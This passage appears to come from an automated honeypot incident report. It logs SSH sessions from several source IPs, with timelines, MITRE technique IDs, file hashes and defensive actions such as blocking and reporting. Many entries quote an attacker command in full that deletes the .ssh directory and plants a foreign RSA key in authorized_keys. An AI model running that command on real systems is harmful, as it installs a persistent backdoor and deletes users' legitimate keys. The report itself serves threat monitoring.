| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:53:27` | `cowrie.session.connect` |
| `2026-06-02 15:53:27` | `cowrie.client.version` |
| `2026-06-02 15:53:27` | `cowrie.client.kex` |
| `2026-06-02 15:53:27` | `cowrie.login.success` |
| `2026-06-02 15:53:27` | `cowrie.session.params` |
| `2026-06-02 15:53:27` | `cowrie.command.input` |
| `2026-06-02 15:53:27` | `cowrie.command.failed` |
| `2026-06-02 15:53:28` | `cowrie.log.closed` |
| `2026-06-02 15:53:28` | `cowrie.session.params` |
| `2026-06-02 15:53:28` | `cowrie.command.input` |
| `2026-06-02 15:53:28` | `cowrie.session.file_download` |
| `2026-06-02 15:53:28` | `cowrie.log.closed` |
| `2026-06-02 15:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f15f9afb15b

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-02 15:53 |
| **Last Seen** | 2026-06-02 15:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:53:29` | `cowrie.session.connect` |
| `2026-06-02 15:53:29` | `cowrie.client.version` |
| `2026-06-02 15:53:29` | `cowrie.client.kex` |
| `2026-06-02 15:53:30` | `cowrie.login.success` |
| `2026-06-02 15:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31666960c1a8

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 15:53 |
| **Last Seen** | 2026-06-02 15:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:53:35` | `cowrie.session.connect` |
| `2026-06-02 15:53:35` | `cowrie.client.version` |
| `2026-06-02 15:53:35` | `cowrie.client.kex` |
| `2026-06-02 15:53:35` | `cowrie.login.success` |
| `2026-06-02 15:53:36` | `cowrie.session.params` |
| `2026-06-02 15:53:36` | `cowrie.command.input` |
| `2026-06-02 15:53:36` | `cowrie.command.failed` |
| `2026-06-02 15:53:36` | `cowrie.log.closed` |
| `2026-06-02 15:53:36` | `cowrie.session.params` |
| `2026-06-02 15:53:36` | `cowrie.command.input` |
| `2026-06-02 15:53:36` | `cowrie.session.file_download` |
| `2026-06-02 15:53:36` | `cowrie.log.closed` |
| `2026-06-02 15:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-989490d83d29

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 15:53 |
| **Last Seen** | 2026-06-02 15:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:53:38` | `cowrie.session.connect` |
| `2026-06-02 15:53:38` | `cowrie.client.version` |
| `2026-06-02 15:53:39` | `cowrie.client.kex` |
| `2026-06-02 15:53:39` | `cowrie.login.success` |
| `2026-06-02 15:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60a1c38cb068

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 15:54 |
| **Last Seen** | 2026-06-02 15:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:54:46` | `cowrie.session.connect` |
| `2026-06-02 15:54:46` | `cowrie.client.version` |
| `2026-06-02 15:54:46` | `cowrie.client.kex` |
| `2026-06-02 15:54:47` | `cowrie.login.success` |
| `2026-06-02 15:54:47` | `cowrie.session.params` |
| `2026-06-02 15:54:47` | `cowrie.command.input` |
| `2026-06-02 15:54:47` | `cowrie.command.failed` |
| `2026-06-02 15:54:47` | `cowrie.log.closed` |
| `2026-06-02 15:54:47` | `cowrie.session.params` |
| `2026-06-02 15:54:47` | `cowrie.command.input` |
| `2026-06-02 15:54:47` | `cowrie.session.file_download` |
| `2026-06-02 15:54:47` | `cowrie.log.closed` |
| `2026-06-02 15:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27533ee8868a

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 15:54 |
| **Last Seen** | 2026-06-02 15:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:54:49` | `cowrie.session.connect` |
| `2026-06-02 15:54:49` | `cowrie.client.version` |
| `2026-06-02 15:54:50` | `cowrie.client.kex` |
| `2026-06-02 15:54:50` | `cowrie.login.success` |
| `2026-06-02 15:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a170b8a298f

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 15:55 |
| **Last Seen** | 2026-06-02 15:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:55:13` | `cowrie.session.connect` |
| `2026-06-02 15:55:13` | `cowrie.client.version` |
| `2026-06-02 15:55:13` | `cowrie.client.kex` |
| `2026-06-02 15:55:14` | `cowrie.login.success` |
| `2026-06-02 15:55:14` | `cowrie.session.params` |
| `2026-06-02 15:55:14` | `cowrie.command.input` |
| `2026-06-02 15:55:14` | `cowrie.command.failed` |
| `2026-06-02 15:55:14` | `cowrie.log.closed` |
| `2026-06-02 15:55:14` | `cowrie.session.params` |
| `2026-06-02 15:55:14` | `cowrie.command.input` |
| `2026-06-02 15:55:15` | `cowrie.session.file_download` |
| `2026-06-02 15:55:15` | `cowrie.log.closed` |
| `2026-06-02 15:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bf4d992b2c7

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 15:55 |
| **Last Seen** | 2026-06-02 15:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:55:17` | `cowrie.session.connect` |
| `2026-06-02 15:55:17` | `cowrie.client.version` |
| `2026-06-02 15:55:17` | `cowrie.client.kex` |
| `2026-06-02 15:55:17` | `cowrie.login.success` |
| `2026-06-02 15:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96f1d91ea660

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 15:55 |
| **Last Seen** | 2026-06-02 15:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:55:55` | `cowrie.session.connect` |
| `2026-06-02 15:55:55` | `cowrie.client.version` |
| `2026-06-02 15:55:56` | `cowrie.client.kex` |
| `2026-06-02 15:55:56` | `cowrie.login.success` |
| `2026-06-02 15:55:57` | `cowrie.session.params` |
| `2026-06-02 15:55:57` | `cowrie.command.input` |
| `2026-06-02 15:55:57` | `cowrie.command.failed` |
| `2026-06-02 15:55:57` | `cowrie.log.closed` |
| `2026-06-02 15:55:58` | `cowrie.session.params` |
| `2026-06-02 15:55:58` | `cowrie.command.input` |
| `2026-06-02 15:55:58` | `cowrie.session.file_download` |
| `2026-06-02 15:55:58` | `cowrie.log.closed` |
| `2026-06-02 15:56:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74845e88811f

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 15:56 |
| **Last Seen** | 2026-06-02 15:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:56:00` | `cowrie.session.connect` |
| `2026-06-02 15:56:00` | `cowrie.client.version` |
| `2026-06-02 15:56:00` | `cowrie.client.kex` |
| `2026-06-02 15:56:01` | `cowrie.login.success` |
| `2026-06-02 15:56:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4755239d0ae

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 15:56 |
| **Last Seen** | 2026-06-02 15:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:56:48` | `cowrie.session.connect` |
| `2026-06-02 15:56:48` | `cowrie.client.version` |
| `2026-06-02 15:56:48` | `cowrie.client.kex` |
| `2026-06-02 15:56:49` | `cowrie.login.success` |
| `2026-06-02 15:56:49` | `cowrie.session.params` |
| `2026-06-02 15:56:49` | `cowrie.command.input` |
| `2026-06-02 15:56:49` | `cowrie.command.failed` |
| `2026-06-02 15:56:49` | `cowrie.log.closed` |
| `2026-06-02 15:56:49` | `cowrie.session.params` |
| `2026-06-02 15:56:49` | `cowrie.command.input` |
| `2026-06-02 15:56:50` | `cowrie.session.file_download` |
| `2026-06-02 15:56:50` | `cowrie.log.closed` |
| `2026-06-02 15:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-763449c2c7a9

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 15:56 |
| **Last Seen** | 2026-06-02 15:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:56:52` | `cowrie.session.connect` |
| `2026-06-02 15:56:52` | `cowrie.client.version` |
| `2026-06-02 15:56:52` | `cowrie.client.kex` |
| `2026-06-02 15:56:52` | `cowrie.login.success` |
| `2026-06-02 15:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0fde1ef1415

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 15:57 |
| **Last Seen** | 2026-06-02 15:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:57:31` | `cowrie.session.connect` |
| `2026-06-02 15:57:31` | `cowrie.client.version` |
| `2026-06-02 15:57:31` | `cowrie.client.kex` |
| `2026-06-02 15:57:31` | `cowrie.login.success` |
| `2026-06-02 15:57:32` | `cowrie.session.params` |
| `2026-06-02 15:57:32` | `cowrie.command.input` |
| `2026-06-02 15:57:32` | `cowrie.command.failed` |
| `2026-06-02 15:57:32` | `cowrie.log.closed` |
| `2026-06-02 15:57:32` | `cowrie.session.params` |
| `2026-06-02 15:57:32` | `cowrie.command.input` |
| `2026-06-02 15:57:32` | `cowrie.session.file_download` |
| `2026-06-02 15:57:32` | `cowrie.log.closed` |
| `2026-06-02 15:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f858a02f056b

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 15:57 |
| **Last Seen** | 2026-06-02 15:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:57:34` | `cowrie.session.connect` |
| `2026-06-02 15:57:34` | `cowrie.client.version` |
| `2026-06-02 15:57:34` | `cowrie.client.kex` |
| `2026-06-02 15:57:35` | `cowrie.login.success` |
| `2026-06-02 15:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed4a8cd2bfb

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 15:59 |
| **Last Seen** | 2026-06-02 15:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:59:19` | `cowrie.session.connect` |
| `2026-06-02 15:59:19` | `cowrie.client.version` |
| `2026-06-02 15:59:19` | `cowrie.client.kex` |
| `2026-06-02 15:59:20` | `cowrie.login.success` |
| `2026-06-02 15:59:21` | `cowrie.session.params` |
| `2026-06-02 15:59:21` | `cowrie.command.input` |
| `2026-06-02 15:59:21` | `cowrie.command.failed` |
| `2026-06-02 15:59:21` | `cowrie.log.closed` |
| `2026-06-02 15:59:21` | `cowrie.session.params` |
| `2026-06-02 15:59:21` | `cowrie.command.input` |
| `2026-06-02 15:59:22` | `cowrie.session.file_download` |
| `2026-06-02 15:59:22` | `cowrie.log.closed` |
| `2026-06-02 15:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-418f72b5a7a7

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 15:59 |
| **Last Seen** | 2026-06-02 15:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:59:24` | `cowrie.session.connect` |
| `2026-06-02 15:59:24` | `cowrie.client.version` |
| `2026-06-02 15:59:24` | `cowrie.client.kex` |
| `2026-06-02 15:59:25` | `cowrie.login.success` |
| `2026-06-02 15:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7d20901508b

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:05 |
| **Last Seen** | 2026-06-02 16:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:05:37` | `cowrie.session.connect` |
| `2026-06-02 16:05:37` | `cowrie.client.version` |
| `2026-06-02 16:05:38` | `cowrie.client.kex` |
| `2026-06-02 16:05:38` | `cowrie.login.success` |
| `2026-06-02 16:05:38` | `cowrie.session.params` |
| `2026-06-02 16:05:38` | `cowrie.command.input` |
